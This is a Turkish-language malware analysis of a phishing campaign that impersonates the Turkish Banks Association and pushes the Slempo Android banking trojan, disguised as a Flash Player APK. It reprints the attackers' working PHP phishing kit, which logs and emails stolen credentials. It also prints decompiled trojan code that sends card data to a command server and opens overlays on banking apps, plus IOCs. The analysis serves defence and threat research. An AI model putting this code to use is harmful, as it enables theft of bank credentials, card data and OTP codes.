# bankalarbirligi Mobil Zararlı Yazılımı: #slempo android bot
Online banka uygulamalarını hedef alan zararlı yazılımlar her geçen gün artmakta ve farklı atak vektörleri ile karşımıza çıkmaktadır.

Geçtiğimiz ay içerisinde birden fazla zararlı yazılım, farklı kaynaklardan, farklı banka müşterilerini ve online finansal işlemleri kullanan kişileri hedef aldı. Bunlardan ilki  bankalarbirligi.com üzerinden çeşitli banka müşterilerine gönderilen oltalama maili ile ön plana çıktı.

İlk olarak [2011 yılının mart ayında çıkan](http://www.ntv.com.tr/ekonomi/kredi-karti-kullanicilarina-sahte-site-uyarisi,8HAQ58PWk0a-BcILzvl3vw?_ref=infinite) ve kredi kartı bilgilerini çalmak üzere oluşturulmuş bir web uygulaması olarak karşımıza çıkan bu domain şimdilerde hem web hem de mobil uygulama olarak karşımıza çıkmaktadır.

![enter image description here](https://i.imgur.com/NpOhiOQ.png)

Farklı alan adları ile kurbanlarına ulaşmaya çalışan saldırganlar e-posta göndermekte ve postanın içeriğinde Türkiye Bankalar Birliği'nin güncelleme adı altında kullanıcılardan ilgili bankadaki hesap bilgilerini girmesini talep etmektedir.

![enter image description here](https://i.imgur.com/01r5jz1.png)

>TBB’ye (Bankalar Birliği) bağlı tüm bankaların SSL yazılımları ve internet bankacılığına hizmet eden bilgisayarlar ve akıllı telefonlar güncellenmektedir 

Örnekte olduğu gibi e-posta içeriği ile ilgili bankalara ait müşterilerin bilgilerinin güncellenmesi gerektiğini belirtmektedir. e-posta ile gelen linke tıkladığınızda 5 farklı banka için hazırlanmış ilgili bankanın online bankacılık uygulamasının birebir kopyası içerik karşınıza çıkmaktadır:

![enter image description here](https://i.imgur.com/Q6n2VhQ.png)

![enter image description here](https://i.imgur.com/diSvEEK.png)

![enter image description here](https://i.imgur.com/sRYCADh.png)

![enter image description here](https://i.imgur.com/BoSMopH.png)

![enter image description here](https://i.imgur.com/nWnDOmo.png)

Saldırgan kurbanlarından ilgili bilgileri girmesini talep edip bu bilgileri daha sonra kullanmak üzere saklamaktadır.

e-posta gönderilen alan adları şu şekildedir:

| Alan Adı |   
|:--------|
|@bankalarbirligi.com|
|@onlinebankalarbirligi.co.uk|
|@bankalarbirligimail.co.uk|
|@renatea.gob.ar|
|@bildirimbankalarbirligi.co.uk|


İlgili alan adı incelendiğinde oltalama için aynı IP adresine ait birden fazla domain ve farklı sanal sunucu bilgileri ile ön plana çıkmaktadır.

| Alan Adı | IP Adresi      |
|:--------| -------------:|
|.bankalarbirligi.com. 								|		162.221.176.52|
|.www.bankalarbirligi.com. 							|		162.221.176.52|
|.dns1.auth-mail.ru. 										|	162.221.176.52 |
|.dns2.auth-mail.ru. 										|	162.221.176.52 |
|.dns2.555mir.ru. 											|162.221.176.52 	|
|.support.apple.com.en-gb.confirm.id.auth.cgi-key.myapple-unlock.web.user.eu-web0-ssl.com.| 	162.221.176.52|
|.verification-id-unlock-web0-ssl.com. 				|		162.221.176.52|
|.dns1.555mir.ru. 										|	162.221.176.52 |
|.eu-web0-ssl.com. 									|		162.221.176.52|
|.american-express-r3ura.com. 						|		162.221.176.52|
|.www.american-express-r3bri.com. 					|		162.221.176.52|
|.www.american-express-r3ura.com. 					|		162.221.176.52|
|.american-express-r3mne.com. 						|		162.221.176.52|
|.american-express-r3gro.com. 						|		162.221.176.52|
|.american-express-r3bri.com. 						|		162.221.176.52|

Saldırıyı gerçekleştirmek isteyenler, hem yurt içinde hem de yurt dışında birçok kişiyi hedef almakta ve geniş çaplı bir oltalama kampanyalardan birisini yönettiği sonucuna varılabilmektedir.

Müşteri ilgili bankadaki kendi hesap bilgilerini girdiği vakit cep telefonuna gönderilen doğrulama kodunu (**OTP**) alabilmek için  **android** telefonlar için tasarlanmış mobil uygulamayı müşteriye indirtmek istemektedir.

![enter image description here](https://i.imgur.com/I8oCxBp.png)

Saldırgan **E-Şifre Güvenlik** adı verdiği uygulamayı bu safhada indirtmektedir.

Saldırgan her bir banka icin hazırladığı  oltalama web sitesinin arka tarafında *PHP* ile hazırlanmış bir uygulama sunmaktadır.
Sunucu üzerinde çalışan

- *control.php*
- *download.php*
- *indir.php*
- *index.php*

kodların içerikleri aşağıdaki gibidir.

```php
<?php
include "../../control.php";
if(isset($_POST["user"]))
{
	$user=$_POST["user"];
	$pass=$_POST["pass"];
	$mob=$_POST["mob"];
	$email=$_POST["email"];
	$type=$_POST["type"];
	$android=0;
	$desktop=0;
	if(strlen($user) < 3 || strlen($pass) < 6 ||  strlen($mob) < 3)
	{
		echo "<script>
window.location.assign(\"index.php?errorID=".rand(10000,999999999).rand(10000,999999999)."&authError=1\");</script>";
die();
}

if($type == "android")
{
	$android=1;
}
else
{
	$desktop=1;
}


$ip=$_SERVER["REMOTE_ADDR"];
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$hostname=gethostbyaddr($ip);
$agent=$_SERVER['HTTP_USER_AGENT'];
if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {
      $oip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $oip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $oip="same";
    }
$details="====================\r\n

User = $user \n
Pass = $pass \n
Mobile = $mob \n
Email = $email \n
Type = $type \n
Bank = $bankname\n
IP = $ip   HostName= $hostname\n
Original IP = $oip \n
User-Agent= $agent \n
Time = $time \n
Date = $date \n
====================\r\n";
if($log_feature==1)
{
	$file=fopen("../../".$logfile,"a");
	fwrite($file,$details);
	fclose($file);
}
if($email_feature==1)
{
	mail($send,"$bankname log  $ip",$details);
}
}
else
{
	echo '<script>window.location.assign("http://www.google.com")</script>';
	die();
}
?>
```
Görüleceği üzere saldırgan kullanıcıdan almış olduğu verilerden:

 - User 
 - Pass 
 - Email 
 - Bank
 - Mobile
 - IP
 - User-Agent
 - Type
 - Time & Date

gibi hassas bilgileri kendi sunucusu üzerindeki **log.txt** dosyasına yazmaktadır. Böylece kullanıcılara ait parola, hesap numarası telefon numarası gibi bilgileri kaydetmektedir.

Kurban **android** cihazdan bağlandığı durumlarda ise web uygulaması *download.php* sayfasına yönlendirilmekte ve android uygulamasını doğrudan cihaza indirtmektedir. Aksi durumlarda ise  kurbanı doğrudan Türk Bankalar Birliğinin ana sayfasına (tbb.org.tr'ye) yönlendirmektedir.

```php
<?php
if($android == 1)
{
echo '
	<script>
	setTimeout(function(){ 
	window.location.assign("../../download.php?client-ID=050541574d65fs9864698g4d6984867986494");
redirect(); }, 3000);
	setTimeout(function(){ 
	window.location.assign("https://www.tbb.org.tr");
	 }, 10000);
	</script>
';
}
else
{
echo '
	<script>
	setTimeout(function(){ 
	window.location.assign("https://www.tbb.org.tr");
	 }, 7000);
	</script>';
}

```
site içerisinde farklı bir kod parçasında ise ilgili zararlı yazılım indirilmekte ya da youtube mobil sitesine yönlendirildiği belirtir kod parçası bulunmaktadır.

```php
<?php
//error_reporting(0);
include "control.php";
if(isset($_GET["client-ID"]))
{

$file="downloads/".$ratname;
 header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
else
{
echo '<script>window.location.assign("http://m.youtube.com")</script>';
}
?>
```

Saldırganın oltalama için kullandığı sunucu üzerinde tuttuğu bir diğer dosya *control.php*  dosyası içeriğinde ise  genel tanımlamalar bulunmaktadır.

```php
<?php

$send="Your email here";
$ratname="AdobeFlashPlayer.apk";
$logfile="logs.txt";

$email_feature=1;  // feature On (1) and off (0) toggle
$log_feature=1;  // feature On (1) and off (0) toggle
?>
```

Görüldüğü gibi sistemde web ortamından kurbana ait hesap bilgileri toplanırken arka diğer tarafta android telefonlar vasıtasıyla **OTP** mesaj bilgisi elde etmeye yönelik zararlı yazılımı cihaza yükletilmek istenmektedir..

indirilen **AdobeFlashPlayer.apk** mobil zararlı yazılımı ise aşağıda belirtilen işlemleri gerçekleştirmektedir.

![enter image description here](https://i.imgur.com/KIqGprP.png)

Uygulamanın istediği izinleri kontrol ettiğimiz zaman şu şekilde bir tablo ile karşı karşıya kalmaktayız

![enter image description here](https://i.imgur.com/hdntub7.png)

- android.permission.ACCESS_FINE_LOCATION
- android.permission.SEND_SMS
- android.permission.RECEIVE_BOOT_COMPLETED
- android.permission.INTERNET
- android.permission.SYSTEM_ALERT_WINDOW
- android.permission.ACCESS_NETWORK_STATE
- android.permission.ACCESS_COARSE_LOCATION
- android.permission.WAKE_LOCK
- android.permission.GET_TASKS
- android.permission.CALL_PHONE
- android.permission.RECEIVE_SMS
- android.permission.READ_PHONE_STATE
- android.permission.READ_SMS

Uygulamanın kaynak kodlarına erişmek için apk dosyası decompile işleminden geçirilerek daha ayrıntılı verilere ulaşılabilmektedir. 
Bu işlem için [jd-gui](http://jd.benow.ca/), [APK2Java](http://www.apk2java.com/) vb. apk dosyalarından java kaynak koda erişmeye izin veren araçlar kullanılabilir.

Uygulama decompile işleminden geçirilip kaynak kodlar incelendiğinde bazı bilgiler ön plana çıkmaktadır.

```java
org.slempo.service.Main
org.slempo.service.DeviceAdminChecker
org.slempo.service.activities.Cards
org.slempo.service.activities.CvcPopup
org.slempo.service.activities.ChangeNumber
org.slempo.service.activities.Commbank
org.slempo.service.activities.Nab
org.slempo.service.activities.Westpack
org.slempo.service.activities.StGeorge
org.slempo.service.activities.GM
org.slempo.service.activities.HTMLDialogs
org.slempo.service.activities.CommonHTML 
``` 

**slempo** paket ismini kullanan daha önceki android zararlı yazılımı [TOR ağını](https://securelist.com/blog/incidents/58528/the-first-tor-trojan-for-android/) kullanarak C&C ile iletişime geçtiği bilinmektedir.

![enter image description here](https://i.imgur.com/9ZFCePn.png)

Zararlı yazılımın yönetildiği Komuta kontrol sunucusuna (C&C) ait ekran görüntüleri de şu şekildedir.

![enter image description here](https://i.imgur.com/EwBs0qB.png)

![enter image description here](https://i.imgur.com/OmaJcJk.png)


TBB adına yayılan **AdobeFlashPlayer** aynı paket adıyla yayılan zararlı uygulamanın aksine HTTP protokolünü kullanmaktadır. 

Zararlı yazılıma ait bazı bulguları irdelersek:

**960422d069c5bcf14b2acbefac99b4c57b857e2a2da199c69e4526e0defc14d7** hash değerine sahip zararlı yazılıma ait [virustotal analizi](https://www.virustotal.com/en/file/960422d069c5bcf14b2acbefac99b4c57b857e2a2da199c69e4526e0defc14d7/analysis/) gibidir.

*Constants.java*

```java
package org.slempo.service;
 
public class Constants
{
  public static final String ADMIN_URL = "http://37.143.14.251:2080/";
  public static final String ADMIN_URL_HTML = "http://37.143.14.251:2080/forms/";
  public static final String APP_ID = "APP_ID";
  public static final String APP_MODE = "3";
  public static final int ASK_SERVER_TIME_MINUTES = 1;
  public static final String BLOCKED_NUMBERS = "BLOCKED_NUMBERS";
  public static final String CLIENT_NUMBER = "2";
  public static final String CODE_IS_SENT = "CODE_IS_SENT";
  public static final String COMMBANK_IS_SENT = "COMMBANK_IS_SENT";
  public static final String CONTROL_NUMBER = "CONTROL_NUMBER";
  public static final String DEBUG_TAG = "DEBUGGING";
  public static final boolean ENABLE_GPS = true;
  public static final String GM_IS_SENT = "GM_IS_SENT";
  public static final String HTML_DATA = "HTML_DATA";
  public static final String HTML_VERSION = "HTML_VERSION";
  public static final String INTERCEPTED_NUMBERS = "INTERCEPTED_NUMBERS";
  public static final String INTERCEPTING_INCOMING_ENABLED = "INTERCEPTING_INCOMING_ENABLED";
  public static final String IS_LINK_OPENED = "IS_LINK_OPENED";
  public static final String IS_LOCK_ENABLED = "IS_LOCK_ENABLED";
  public static final int LAUNCH_CARD_DIALOG_WAIT_MINUTES = 1;
  public static final String LINK_TO_OPEN = "http://xxxmobiletubez.com/video.php";
  public static final String LISTENING_SMS_ENABLED = "LISTENING_SMS_ENABLED";
  public static final int MESSAGES_CHUNK_SIZE = 1000;
  public static final String MESSAGES_DB = "MESSAGES_DB";
  public static final String NAB_IS_SENT = "NAB_IS_SENT";
  public static final String PHONE_IS_SENT = "PHONE_IS_SENT";
  public static final String PREFS_NAME = "AppPrefs";
  public static final String ST_JEORGE_IS_SENT = "ST_JEORGE_IS_SENT";
  public static final String WESTPACK_IS_SENT = "WESTPACK_IS_SENT";
   
  public Constants() {}
}
```
dikkat edileceği üzere sabit değişkenlerin bulunduğu dosya içerisinde **IP** adresleri ve bazı URL bilgileri bulunmaktadır.  Zararlının iletişime geçtiği C&C sunucu bilgisi

```java
    CreditCardNumberEditText$OnCreditCardTypeChangedListener
```
sınıfında *sendData* ile **37.143.14.251** IP adresi **2080** portuna veri gönderdiği görülmektedir.

```java
    private void sendData() {
        Sender.sendCardData((Context)this, "http://37.143.14.251:2080/", new Card(this.ccBox.getText().toString(), this.expiration1st.getText().toString(), this.expiration2nd.getText().toString(), this.cvcBox.getText().toString()), new BillingAddress(this.nameOnCard.getText().toString(), this.dateOfBirth.getText().toString(), this.zipCode.getText().toString(), this.streetAddress.getText().toString(), "+" + this.countryPrefix.getText().toString() + this.phoneNumber.getText().toString()), new AdditionalInformation(this.vbvPass.getText().toString(), this.oldVbvPass));
    }
```

Zararlı uygulamanın cihaz tarafında yaptığı diğer işlemlere bakarsak:
Zararlı mobil cihazı ilklendirirken cihaza ait çeşitli verileri C&C sunucuya göndermekte ve bu verilere göre enfekte olmuş cihaz için bir ID almaktadır.

![](https://i.imgur.com/xcsHObE.png)

![](https://i.imgur.com/vLSUjGc.png)

zararlı belirli aralıklarla (her dakikada bir) C&C sunucuna bağlanıp yeni komut beklemektedir.

![](http://i.imgur.com/rTn5TUy.png)


Zararlının C&C sunucusuna gönderdiği verilerin bulunduğu sınıflar

- sendAccountData
- sendAppCodeData
- sendBillingData
- sendCallsForwarded
- sendCallsForwardingDisabled
- sendCardData
- sendCheckData
- sendControlNumberData
- sendFormsData
- sendGPSData
- sendHTMLUpdated
- sendInitialData
- sendInstalledApps
- sendInterceptedIncomingSMS
- sendListenedIncomingSMS
- sendListenedOutgoingSMS
- sendListeningStatus
- sendLockStatus
- sendNotificationSMSSentData
- sendPhoneData
- sendRentStatus
- sendReport
- sendStGeorgeBillingData
- sendStartBlockingNumbersData
- sendUnblockAllNumbersData

olarak görülmüştür.

Uygulamanın arka planda çalıştırdığı komutların bulunduğu sınıflar ise:

- hasCommand
- processInterceptSMSStartCommand
- processInterceptSMSStopCommand
- processCheckGPSCommand
- processBlockNumbersCommand
- processUnblockAllNumbersCommand
- processUnblockNumbersCommand
- processListenSMSStartCommand
- processListenSMSStopCommand
- processGrabAppsCommand
- processLockCommand
- processUnlockCommand
- processSendMessageCommand
- processSentIDCommand
- processControlNumberCommand
- processCheckCommand
- processShowHTMLCommand
- processForwardCallsCommand
- processDisableForwardCallsCommand
- processUpdateHTMLCommand

şeklindedir. 
Görüldüğü üzere Çağrı yönlendirmeden, sms dinlemeye, gps konumu tespit etmeden, numara bloklamaya kadar farklı işlevleri kullanıcıdan habersiz bir şekilde yapmaktadır.

Zararlı yazılımın çalıştığı cihazda herhangi bir uygulama açılıp zararlının bu uygulamaya karşı reaksiyonu incelenmiştir. Örnek olarak  Google Play Store açıldığı zaman işletim sistemi üzerinde aşağıdaki kayıtlar düşmektedir.


```
I/InputDispatcher(  511): Dropping event because there is no touchable window at (778, 972).
I/ActivityManager(  511): START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=com.android.vending/.AssetBrowserActivity} from pid 690
D/dalvikvm(  511): GC_FOR_ALLOC freed 1660K, 23% free 10811K/13872K, paused 8ms, total 8ms
I/ActivityManager(  511): Start proc com.android.vending for activity com.android.vending/.AssetBrowserActivity: pid=2710 uid=10078 gids={50078, 3003, 1028, 1015}
D/Finsky  ( 2710): [1] FinskyApp.onCreate: Initializing network with DFE https://android.clients.google.com/fdfe/
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
D/dalvikvm( 2710): GC_CONCURRENT freed 297K, 10% free 3289K/3636K, paused 2ms+2ms, total 5ms
D/Finsky  ( 2710): [1] DailyHygiene.goMakeHygieneIfDirty: No need to run daily hygiene.
W/Settings( 2710): Setting download_manager_max_bytes_over_mobile has moved from android.provider.Settings.Secure to android.provider.Settings.Global.
W/Settings( 2710): Setting download_manager_recommended_max_bytes_over_mobile has moved from android.provider.Settings.Secure to android.provider.Settings.Global.
D/Finsky  ( 2710): [1] 2.run: Loaded library for account: [82l_nLYaM8KCGZY41jomHcAuIvo]
D/Finsky  ( 2710): [1] 2.run: Finished loading 1 libraries.
D/Finsky  ( 2710): [1] GmsCoreHelper.cleanupNlp: result=false type=4
D/Finsky  ( 2710): [1] SelfUpdateScheduler.checkForSelfUpdate: Skipping DFE self-update. Local Version [80260017] >= Server Version [-1]
D/Finsky  ( 2710): [1] UpdateWidgetsReceiver.onReceive: Updated 0 MarketWidgetProvider widgets (com.google.android.finsky.action.TOC_SET)
D/Finsky  ( 2710): [1] UpdateWidgetsReceiver.onReceive: Updated 0 RecommendedWidgetProvider widgets (com.google.android.finsky.action.TOC_SET)
D/Finsky  ( 2710): [1] RestoreTracker.stopServiceIfDone: Restore complete with 0 success and 0 failed.
I/ActivityManager(  511): Displayed com.android.vending/.AssetBrowserActivity: +471ms
D/Finsky  ( 2710): [1] MainActivity.initializeBilling: Optimistically initializing billing parameters.
D/Finsky  ( 2710): [1] BaseWidgetProvider.onReceive: Received ACTION_APPWIDGET_UPDATE, updating 0 widgets.
D/dalvikvm( 2710): GC_CONCURRENT freed 376K, 8% free 5626K/6052K, paused 2ms+0ms, total 5ms
``` 
>Kayıtlara erişim için logcat uygulamasından yararlanmıştır.

gibi log satırları düşerken, zararlıya ait servis de bu uygulamaya karşı tepki vermekte ve ekrana bir açılır pencere açtığı görülmektedir.

```
I/ActivityManager(  511): START u0 {flg=0x10020000 cmp=org.slempo.service/.activities.Cards} from pid 2683
D/        (  511): HostConnection::get() New Host Connection established 0xb7a504a8, tid 672
D/MobileDataStateTracker(  511): default: setPolicyDataEnable(enabled=true)
I/ActivityManager(  511): Displayed org.slempo.service/.activities.Cards: +390ms
D/Finsky  ( 2710): [1] CarrierParamsAction.createCarrierBillingParameters: Carrier billing config is null. Device is not targeted for DCB 2.
E/Finsky  ( 2710): [235] FileBasedKeyValueStore.delete: Attempt to delete 'params69dzFR3t8LGNQGIyh8Kkfw' failed!
D/Finsky  ( 2710): [1] GetBillingCountriesAction.run: Skip getting fresh list of billing countries.
I/ActivityManager(  511): START u0 {act=com.android.systemui.recent.action.TOGGLE_RECENTS flg=0x10800000 cmp=com.android.systemui/.recent.RecentsActivity (has extras)} from pid 570
D/dalvikvm(  511): GC_FOR_ALLOC freed 800K, 18% free 11407K/13868K, paused 7ms, total 7ms

``` 
şeklinde **slempo** servisinin **Cards**  aktivitesinin etkinleştiği görülmektedir.

```
I/ActivityManager(  511): Displayed org.slempo.service/.activities.Cards: +390ms
```

daha sonra ise **CvcPopup**  aktivitesinin etkinleştiği gözlemlenebilmektedir.
```
I/ActivityManager(  511): START u0 {flg=0x10020000 cmp=org.slempo.service/.activities.CvcPopup} from pid 2683
``` 

![enter image description here](https://i.imgur.com/jQkzF6V.png)


![enter image description here](https://i.imgur.com/EL552jA.png)


![enter image description here](https://i.imgur.com/q9zy9dC.png)


![enter image description here](https://i.imgur.com/lKkJ2yV.png)


![enter image description here](https://i.imgur.com/uZJhWGA.png)

dikkat edilirse **screen injection** yöntemi kullanılarak asıl uygulamanın sormadığı fakat zararlı yazılımın elde etmek istediği bilgileri C&C sunucusuna gönderilmektedir.

Yine aynı şekilde kullanıcı gmail'i açtığı anda yine zararlı devreye girmektedir.

```syslog
I/ActivityManager(  511): START u0 {flg=0x10020000 cmp=org.slempo.service/.activities.GM} from pid 5876
I/ActivityManager(  511): Displayed org.slempo.service/.activities.GM: +151ms
I/ActivityManager(  511): START u0 {flg=0x10124000 cmp=org.slempo.service/.activities.GM} from pid 570
I/ActivityManager(  511): Displayed org.slempo.service/.activities.GM: +68ms
I/ActivityManager(  511): Killing 5876:org.slempo.service/u0a58 (adj 16): remove task
I/WindowState(  511): WIN DEATH: Window{52ad13b4 u0 org.slempo.service}
``` 
![enter image description here](https://i.imgur.com/Kq8hICR.png)

![enter image description here](https://i.imgur.com/2ugtc4j.png)

```syslog
org.slempo.service/.activities.GM
```

Servisi çalışmakta ve gmail kullanıcı adı ve parolasını da ele geçirmek için açılır pencere vasıtasıyla bilgileri ele geçirmektedir.

Uygulamanın kaynak kodlarında yer alan sınıflardan:

![enter image description here](https://i.imgur.com/w0LSSxn.png)

- https://www.commbank.com.au/
- https://ibanking.stgeorge.com.au/
- https://www.nab.com.au/personal/banking/nab-internet-banking
- https://www.westpac.com.au/personal-banking/online-banking/features/

gibi siteleri hedef alması zararlının farklı bir kıtayı hedefler iken kurban portföyünü genişletmek adına türk banka müşterilerini de hedef aldığını söyleyebiliriz.

Zararlının kaynak kodlarında yer alan

```java
 public void run()
          {
            String str;
            try
            {
              Object localObject = MainService.this.getTopRunning();
              str = MainService.this.getHTMLForPackageName((String)localObject);
              if (((isRunning("com.android.vending")) || (isRunning("com.google.android.music"))) && (!MainService.settings.getBoolean("CODE_IS_SENT", false)))
              {
                localObject = new Intent(MainService.this, Cards.class);
            ...
              }
              if (((isRunning("com.whatsapp")) || (isRunning("com.viber.voip")) || (isRunning("com.instagram.android")) || (isRunning("com.skype.raider"))) && (!MainService.settings.getBoolean("PHONE_IS_SENT", false)))
              {
                localObject = new Intent(MainService.this, ChangeNumber.class);
            ...
              }
            }
	    ...
            Intent localIntent1;
            if ((isRunning("com.google.android.gm")) && (!MainService.settings.getBoolean("GM_IS_SENT", false)))
            {
              localIntent1 = new Intent(MainService.this, GM.class);
	...
            }
            if (((isRunning("com.commbank.netbank")) || (isRunning("com.cba.android.netbank"))) && (!MainService.settings.getBoolean("COMMBANK_IS_SENT", false)))
            {
              localIntent1 = new Intent(MainService.this, Commbank.class);
    	...
            }
            if ((isRunning("au.com.nab.mobile")) && (!MainService.settings.getBoolean("NAB_IS_SENT", false)))
            {
              localIntent1 = new Intent(MainService.this, Nab.class);
        ...
            }
            if ((isRunning("org.westpac.bank")) && (!MainService.settings.getBoolean("WESTPACK_IS_SENT", false)))
            {
              localIntent1 = new Intent(MainService.this, Westpack.class);
     	...
            }
            if ((isRunning("org.stgeorge.bank")) && (!MainService.settings.getBoolean("ST_JEORGE_IS_SENT", false)))
            {
              localIntent1 = new Intent(MainService.this, StGeorge.class);
       ...
            }

```
satırlarıyla  zararlının hedef aldığı uygulamalar da görülebilmektedir.

- com.android.vending
- com.google.android.music
- com.whatsapp
- com.viber.voip
- com.instagram.android
- com.skype.raider
- com.google.android.gm
- com.commbank.netbank
- com.cba.android
- au.com.nab.mobile
- org.stgeorge.bank
- org.westpac.bank

örnek olarak viber uygulaması açıldığında kullanıcıya ait doğrulama kodunun gönderileceği telefon numarası bilgisine erişim
![](http://i.imgur.com/8ai5MoS.png)
![](http://i.imgur.com/vDJdRTc.png)

Zararlıya ait ioc bilgilerine [buradan](iocs/AdobeFlashPlayer.apk.ioc) erişebilirsiniz.
